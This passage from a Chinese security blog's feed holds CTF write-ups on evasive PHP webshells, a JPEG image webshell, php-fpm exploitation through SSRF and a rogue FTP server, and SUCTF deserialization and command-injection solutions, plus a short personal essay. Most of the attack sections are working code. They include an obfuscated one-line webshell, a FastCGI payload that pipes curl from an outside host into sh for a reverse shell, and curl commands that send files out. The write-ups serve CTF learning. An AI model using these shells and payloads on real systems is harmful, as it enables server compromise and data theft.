class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 在php中base64解码函数是很强的,基本上咋写都可以解析</span><br><span class="line"># 除了个别规则以外</span><br><span class="line">例如:</span><br><span class="line">字符串: a</span><br><span class="line">base64: YQ==</span><br><span class="line">php_1:</span><br><span class="line">base64: ----Y|Q==</span><br><span class="line">解码为: a</span><br><span class="line">解码情况: 成功</span><br><span class="line">php_2:</span><br><span class="line">base64: ^Y-|]--[Q-=)=</span><br><span class="line">解码为: a</span><br><span class="line">解码情况: 成功</span><br><span class="line">php_3:</span><br><span class="line">base64: 来Y测Q=试=啊</span><br><span class="line">解码为: a</span><br><span class="line">解码情况: 成功</span><br><span class="line">php_4:</span><br><span class="line">base64: YQ==Yg==</span><br><span class="line">解码为: 第⼀个YQ==成功解码,第⼆个YQ==会解析成乱码</span><br><span class="line">解码情况: YQ==会解析为a, Yg==会解析为乱码, YQ==遇到=号了解析完毕以后后⾯的base64都</span><br><span class="line">会乱码</span><br><span class="line"></span><br><span class="line">基础编码:</span><br><span class="line">字符串: aaa!~~!aa123g</span><br><span class="line">base64: YWFhIX5+IWFhMTIzZw==</span><br></pre></td></tr></table></figure><p>那么这个姿势在进⾏编写免杀⻢⼦的时候就特别适合了<br>因为这⼏个特性是php独有的,其他语⾔解码会乱码<br>例如写⼀个基础的⼀句话⽊⻢然后混淆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">⽂件名: test.php</span><br><span class="line">&lt;?php</span><br><span class="line">assert(get_defined_vars()[&#x27;_GET&#x27;][1]);</span><br><span class="line">?&gt;</span><br><span class="line">混淆</span><br><span class="line">&lt;?php</span><br><span class="line">$base64_decode_str = &#x27;edoced_46esab&#x27;;</span><br><span class="line">$base64_decode = strrev($base64_decode_str);</span><br><span class="line">// get_defined_vars 的 base64</span><br><span class="line">$parameter_base64 = &#x27;Z~2!!!V#0%X&#123;2&#125;R.l;Z,ml.u|Z-W^R……f*dmFycw==^^^^^^&#x27;;</span><br><span class="line">$parameter = $base64_decode($parameter_base64);</span><br><span class="line">// assert 的 base64</span><br><span class="line">$assert_base64 = &#x27;&lt;&gt;-Y|X_N@z!Z\X]J[0:.::::&#x27;;</span><br><span class="line">$asser = $base64_decode($assert_base64);</span><br><span class="line">// 利⽤</span><br><span class="line">$asser($parameter()[&#x27;_GET&#x27;][1]);</span><br><span class="line">?&gt;</span><br><span class="line">利⽤⽅法: http://127.0.0.1/test.php?1=phpinfo();</span><br></pre></td></tr></table></figure><h2 id="开始讲图片马"><a href="#开始讲图片马" class="headerlink" title="开始讲图片马"></a>开始讲图片马</h2><p>附一段代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if(strlen($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])&gt;0)&#123;</span><br><span class="line">    $filetype = $_FILES[&#x27;file&#x27;][&#x27;type&#x27;];</span><br><span class="line">    $tmpname = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $ef = getimagesize($tmpname);</span><br><span class="line"></span><br><span class="line">    if( ($filetype==&quot;image/jpeg&quot;) &amp;&amp; ($ef!=false) &amp;&amp; ($ef[&#x27;mime&#x27;]==&#x27;image/jpeg&#x27;))&#123;</span><br><span class="line">    $content = base64_decode(file_get_contents($tmpname));</span><br><span class="line">    file_put_contents(&quot;shell.php&quot;, $content);</span><br><span class="line">        echo &quot;file upload success!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里严格限制了图片类型，不仅需要通过getimagesize校验，还要比对mime信息，最后还要进行base64的解码</p><p>这就要求我们构造一个可以正常使用的照片，只保留base64编码中的64种字符，图片信息不能存在可见字符，还不能破坏图片的结构</p><p>经过精心构造（ctfshow群主构造的图片tql），得到下面的图片</p><p>PD89YCRfR0VUWzFdYDs7Pz4C</p><p>base64_decode以后即达到目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_GET[1]`;;?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d8490964902f456ca8e1a4572f1032af.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>实际图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://img-blog.csdnimg.cn/6cf18af3033c4a46b93068cde6d05abb.png</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/6cf18af3033c4a46b93068cde6d05abb.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>图片上传完成后由于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content = base64_decode(file_get_contents($tmpname));</span><br><span class="line">file_put_contents(&quot;shell.php&quot;, $content);</span><br></pre></td></tr></table></figure><p>访问shell.php可成功rce</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;图片马&quot;&gt;&lt;a href=&quot;#图片马&quot; class=&quot;headerlink&quot; title=&quot;图片马&quot;&gt;&lt;/a&gt;图片马&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;本文主要是基于jpg格式的图片型webshell的研究，即再正常图片中隐藏webshell代码，从而达到w</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>挑战，还是挑战</title>
    <link href="http://websec.space/2022/04/15/%E6%8C%91%E6%88%98%EF%BC%8C%E8%BF%98%E6%98%AF%E6%8C%91%E6%88%98/"/>
    <id>http://websec.space/2022/04/15/%E6%8C%91%E6%88%98%EF%BC%8C%E8%BF%98%E6%98%AF%E6%8C%91%E6%88%98/</id>
    <published>2022-04-14T16:00:00.000Z</published>
    <updated>2022-04-15T14:30:22.019Z</updated>
    
    <content type="html"><![CDATA[<h1 id="挑战，还是挑战"><a href="#挑战，还是挑战" class="headerlink" title="挑战，还是挑战"></a>挑战，还是挑战</h1><blockquote><p>好久没写，闲聊了，在今晚不知所措之时写点东西。</p></blockquote><p>​        真正去积淀些东西，会让自己觉得疲倦，真想去挑战，却觉得在输出中没有所得。纠结，还是纠结。人遇到些机会，都不会愿意放弃，但我更想去冲些不切实际的东西，如果不去挑战，我现在还不知道在干什么呢。</p><p>​        说到从不会到会，从0到1我是很有勇气去搞得，不管会与不会，真到了有人要推我一把，想把我推出来，我肯定会不顾一切的登场，有的时候输的很惨，有的时候会有些意外之喜。但真有了些成绩之后，我迟疑了，要不要继续出发，CTF每当我进了舒适圈之后，总有一场比赛告诉我，“你怎么什么也不会？”这是一种无奈感，当下再冲的也是一种无奈。CTF，挖洞是经验的积淀，项目就更像是知识的积淀，这东西没头，也没尾。</p><p>​        另外关于团队作战，是特别羡慕那种大家都能齐头并进的队伍的。一支队伍里面一旦有一个人想懈怠，这产生的副作用也是我无法想的，我很想去避免发生这种事情，但到了最后，我甚至说不出一句责备的话来。可能，也可能是一定，我总在队伍走不下去的时候，有一种莫名的责任感，这种感觉让我，总要在一些时候，要站出来。我急啊，这好像是一种莫名的感觉。我不想倒下，甚至这时候队友都会喷你（他其实想放弃了，这时候站出来，无异于加大他的工作量）。</p><p>​        挑战还有一种神奇的感觉，就是会让你头上悬起一把剑，这导致你不想努力，也不想玩，这种状态可能就叫摸鱼（什么也不想干）。</p><p>这种状态是及其难受的，常让人觉得喘不过气来。</p><p>​        挑战的开始总是欲望，挑战的最后总是坚持。</p><p>（夜深了，从办公室回宿舍的路上，明天早上看看，可能就是晚上的胡言乱语）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;挑战，还是挑战&quot;&gt;&lt;a href=&quot;#挑战，还是挑战&quot; class=&quot;headerlink&quot; title=&quot;挑战，还是挑战&quot;&gt;&lt;/a&gt;挑战，还是挑战&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;好久没写，闲聊了，在今晚不知所措之时写点东西。&lt;/p&gt;
&lt;/blockqu</summary>
      
    
    
    
    <category term="闲聊" scheme="http://websec.space/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="闲聊" scheme="http://websec.space/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>php-fpm未授权</title>
    <link href="http://websec.space/2022/04/08/php-fpm%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
    <id>http://websec.space/2022/04/08/php-fpm%E6%9C%AA%E6%8E%88%E6%9D%83/</id>
    <published>2022-04-07T16:00:00.000Z</published>
    <updated>2022-04-07T16:31:23.842Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php-fpm未授权"><a href="#php-fpm未授权" class="headerlink" title="php-fpm未授权"></a>php-fpm未授权</h1><p>php-fpm是个中间件，在需要php解释器来处理.php文本时会用到php-fpm。自从php5.3.3以后就将php-fpm集成在php内核中。PHP-FPM提供了更好的PHP进程管理方式，可以有效控制内存和进程、可以平滑重载PHP配置。</p><h3 id="1-CGI"><a href="#1-CGI" class="headerlink" title="1.CGI"></a>1.CGI</h3><p>CGI(common gateway interface )通用网关接口，是webserver和web应用程序交流时的一组接口规范。</p><h3 id="2-Fast-cgi"><a href="#2-Fast-cgi" class="headerlink" title="2.Fast-cgi"></a>2.Fast-cgi</h3><p>FastCGI可以理解为一种协议，用于web服务器（nginx，Apache）和处理程序间进行通信，是一种应用层通信协议。是cgi协议的升级版</p><p>fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，从而避免了每个请求进程创建和终止的开销，大大提高了效率。</p><h3 id="3-Php-cgi"><a href="#3-Php-cgi" class="headerlink" title="3.Php-cgi"></a>3.Php-cgi</h3><p>php-cgi是一个进程。php-cgi实现了cgi这种协议，但是它是单进程的，一个进程处理一个请求，处理结束后进程就自我销毁。</p><p><img src="https://upload-images.jianshu.io/upload_images/15150269-161086523c94ae09.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/635/format/webp" alt="img"></p><h2 id="web810"><a href="#web810" class="headerlink" title="web810"></a>web810</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$url=$_GET[&#x27;url&#x27;];</span><br><span class="line">$ch=curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">curl_setopt($ch,CURLOPT_HEADER,1);</span><br><span class="line">curl_setopt($ch,CURLOPT_RETURNTRANSFER,0);</span><br><span class="line">curl_setopt($ch,CURLOPT_FOLLOWLOCATION,0);</span><br><span class="line">$res=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure><p>存在ssrf，直接用gopher生成payload</p><p><img src="https://img-blog.csdnimg.cn/fca3590189794a6a86623d17376b29e1.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/6526a7df36dc49f2a70ecc3c77a8d2b4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="web811"><a href="#web811" class="headerlink" title="web811"></a>web811</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">$content = $_GET[&#x27;content&#x27;];</span><br><span class="line">file_put_contents($file, $content);</span><br></pre></td></tr></table></figure><p>此处如果能写直接就打了，可惜不行。</p><p>此处的大概思路是，ftp来与vps连接，vps告诉他，你去访问自己的9000端口，然后他将content内容带入即，通过gopher即可成功反弹shell。 总之就是ftp欺骗可以这么理解。</p><p>可以手撸，也可以用下面的脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((&#x27;0.0.0.0&#x27;, 21))</span><br><span class="line">s.listen(1)</span><br><span class="line">print(&#x27;ctfshow FtpEvilServer listening 0.0.0.0 21\n&#x27;)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(b&#x27;200 c\n&#x27;)</span><br><span class="line">conn.send(b&#x27;200 t\n&#x27;)</span><br><span class="line">conn.send(b&#x27;200 f\n&#x27;)</span><br><span class="line">conn.send(b&#x27;300 s\n&#x27;)</span><br><span class="line">conn.send(b&#x27;200 h\n&#x27;)</span><br><span class="line">conn.send(b&#x27;227 127,0,0,1,0,9000\n&#x27;)</span><br><span class="line">conn.send(b&#x27;150 o\n&#x27;)</span><br><span class="line">time.sleep(1)</span><br><span class="line">conn.send(b&#x27;250 w\n&#x27;)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=ftp://101.42.138.249/&amp;content=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH104%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00h%04%00%3C%3Fphp%20system%28%27curl%20https%3A//your-shell.com/101.42.138.249%3A1337%20%7C%20sh%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure><p>成功反弹shell</p><p><img src="https://img-blog.csdnimg.cn/8cd5e3b5f867445a9640b80ae88ac357.png" alt="img"></p><h2 id="web812"><a href="#web812" class="headerlink" title="web812"></a>web812</h2><p>这题模拟的在公网开放了php-fpm端口，直接用p神的脚本</p><p>file写一个php自带的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py pwn.challenge.ctf.show /usr/local/lib/php/System.php</span><br></pre></td></tr></table></figure><p>即可反弹shell</p><p><img src="https://img-blog.csdnimg.cn/4b8de46da4a644c98f26e9eb5e43cce8.png" alt="img"></p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">Fastcgi PHP-FPM Client &amp;&amp; Code Execution (github.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php-fpm未授权&quot;&gt;&lt;a href=&quot;#php-fpm未授权&quot; class=&quot;headerlink&quot; title=&quot;php-fpm未授权&quot;&gt;&lt;/a&gt;php-fpm未授权&lt;/h1&gt;&lt;p&gt;php-fpm是个中间件，在需要php解释器来处理.php文本时会用到php</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>suctf</title>
    <link href="http://websec.space/2022/04/01/[suctf%20ezpop]/"/>
    <id>http://websec.space/2022/04/01/[suctf%20ezpop]/</id>
    <published>2022-03-31T16:00:00.000Z</published>
    <updated>2022-04-01T14:45:13.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="suctf"><a href="#suctf" class="headerlink" title="[suctf]"></a>[suctf]</h1><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>题目源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class crow</span><br><span class="line">&#123;</span><br><span class="line">    public $v1;</span><br><span class="line">    public $v2;</span><br><span class="line"></span><br><span class="line">    function eval() &#123;</span><br><span class="line">        echo new $this-&gt;v1($this-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class fin</span><br><span class="line">&#123;</span><br><span class="line">    public $f1;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;f1 . &#x27;114514&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function run()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($a, $b)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class what</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a-&gt;run();</span><br><span class="line">        return &#x27;hello&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class mix</span><br><span class="line">&#123;</span><br><span class="line">    public $m1;</span><br><span class="line"></span><br><span class="line">    public function run()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        eval(&#x27;#&#x27; . $this-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题还算比较简单，链子可能挖到比较长，但这个容易看出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$f=new fin();</span><br><span class="line">$f-&gt;f1=new what();</span><br><span class="line">$f-&gt;f1-&gt;a=new mix();</span><br><span class="line">$f-&gt;f1-&gt;a-&gt;m1=new crow();</span><br><span class="line">$f-&gt;f1-&gt;a-&gt;m1-&gt;v1=new fin();</span><br><span class="line">$f-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1=new mix();</span><br><span class="line">$f-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1=&#x27;?&gt;&lt;?php eval($_POST[1]);?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($f);</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A26%3A%22%3F%3E%3C%3Fphp%20eval(%24_POST%5B1%5D)%3B%3F%3E%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7Dhello114514&amp;1=system(&#x27;nl `ls`&#x27;);</span><br></pre></td></tr></table></figure><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>题目源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line">import random</span><br><span class="line">from urllib import parse</span><br><span class="line">import os</span><br><span class="line">from werkzeug.utils import secure_filename</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">def waf(s):</span><br><span class="line">    blacklist = [&#x27;import&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27; &#x27;,&#x27;_&#x27;,&#x27;|&#x27;,&#x27;;&#x27;,&#x27;&quot;&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;&amp;&#x27;,&#x27;getattr&#x27;,&#x27;os&#x27;,&#x27;system&#x27;,&#x27;class&#x27;,&#x27;subclasses&#x27;,&#x27;mro&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;eval&#x27;,&#x27;if&#x27;,&#x27;subprocess&#x27;,&#x27;file&#x27;,&#x27;open&#x27;,&#x27;popen&#x27;,&#x27;builtins&#x27;,&#x27;compile&#x27;,&#x27;execfile&#x27;,&#x27;from_pyfile&#x27;,&#x27;config&#x27;,&#x27;local&#x27;,&#x27;self&#x27;,&#x27;item&#x27;,&#x27;getitem&#x27;,&#x27;getattribute&#x27;,&#x27;func_globals&#x27;,&#x27;__init__&#x27;,&#x27;join&#x27;,&#x27;__dict__&#x27;]</span><br><span class="line">    flag = True</span><br><span class="line">    for no in blacklist:</span><br><span class="line">        if no.lower() in s.lower():</span><br><span class="line">            flag= False</span><br><span class="line">            print(no)</span><br><span class="line">            break</span><br><span class="line">    return flag</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    &quot;欢迎来到SUctf2022&quot;</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/calc&quot;,methods=[&#x27;GET&#x27;])</span><br><span class="line">def calc():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(&quot;num&quot;)</span><br><span class="line">    log = &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    if waf(num):</span><br><span class="line">        try:</span><br><span class="line">            data = eval(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        return str(data)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;waf!!&quot;   </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=5000)  </span><br></pre></td></tr></table></figure><p>这个题再比赛的时候，拿eval当突破口，结果搞了半天一直报错。</p><p>又去试system，麻烦在没有回显，可以用`来执行系统命令，但当时人傻了，拿curl没带出数据直接摆烂，看了atao师傅的wp，恍然大悟哈哈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log = &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)</span><br></pre></td></tr></table></figure><p>直接回带/tmp/log.txt就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?num=1+1#`ls`</span><br><span class="line">?num=1%2B1%23%60curl%09http://ip:port%09-F%09xx=@./tmp/log.txt%60</span><br><span class="line">?num=1%2B1%23%60cat%09/Th1*%60</span><br><span class="line">?num=1%2B1%23%60curl%09http://ip:port%09-F%09xx=@./tmp/log.txt%60</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="https://img-blog.csdnimg.cn/62448df5bd3d4a6fb460c2881c6876fb.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;suctf&quot;&gt;&lt;a href=&quot;#suctf&quot; class=&quot;headerlink&quot; title=&quot;[suctf]&quot;&gt;&lt;/a&gt;[suctf]&lt;/h1&gt;&lt;h2 id=&quot;ezpop&quot;&gt;&lt;a href=&quot;#ezpop&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>suctf web upgdstore</title>
    <link href="http://websec.space/2022/03/31/suctf%20web/"/>
    <id>http://websec.space/2022/03/31/suctf%20web/</id>
    <published>2022-03-30T16:00:00.000Z</published>
    <updated>2022-03-30T18:48:28.217Z</updated>
    
